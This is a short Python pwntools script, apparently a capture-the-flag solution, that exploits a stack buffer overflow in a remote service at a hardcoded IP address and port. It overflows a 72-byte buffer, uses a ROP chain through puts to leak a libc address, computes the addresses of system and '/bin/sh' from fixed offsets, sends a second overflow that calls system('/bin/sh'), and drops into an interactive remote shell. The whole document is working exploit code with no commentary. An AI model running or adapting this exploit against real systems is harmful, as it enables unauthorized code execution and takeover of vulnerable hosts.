from pwn import *
#context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

#t = remote('192.168.5.148', 9999)
t = remote('111.198.29.45', 31789)
payload = cyclic(72)
got_read = 0x601028
got_puts = 0x601018
plt_puts = 0x400500
pop_rdi_ret = 0x400763
addr_ret = 0x4006B8
tmp_payload = cyclic(96)
payload_len = len(cyclic(72) + p64(got_puts) + p64(plt_puts) + p64(pop_rdi_ret)+p64(addr_ret))
print payload_len
def write(data, flag):
	if flag:
		for i in data:
			t.send(i)
	else:
		data = p64(data)
		for i in data:
			t.send(i)

#raw_input()
write(payload,True)
write(pop_rdi_ret,False)
write(got_puts,False)
write(plt_puts,False)
write(addr_ret,False)
write(tmp_payload,True)
t.recvline()
addr_puts = u64(t.recvuntil('\n',drop = True).ljust(0x8,'\x00'))
log.info(hex(addr_puts))
addr_sys = addr_puts - 0x06f690 + 0x045390
addr_bin = addr_puts - 0x06f690 + 0x18cd57
log.info(hex(addr_sys))
print len(cyclic(72) + p64(pop_rdi_ret) + p64(pop_rdi_ret)+ p64(pop_rdi_ret))
#raw_input()
payload = cyclic(72)
write(payload,True)
#raw_input()
#write('\x00\x00\x00\x00\xf9\x06\x40',True)
write(pop_rdi_ret,False)
write(addr_bin,False)
write(addr_sys,False)
tmp_payload = cyclic(104)
write(tmp_payload,True)
t.interactive()
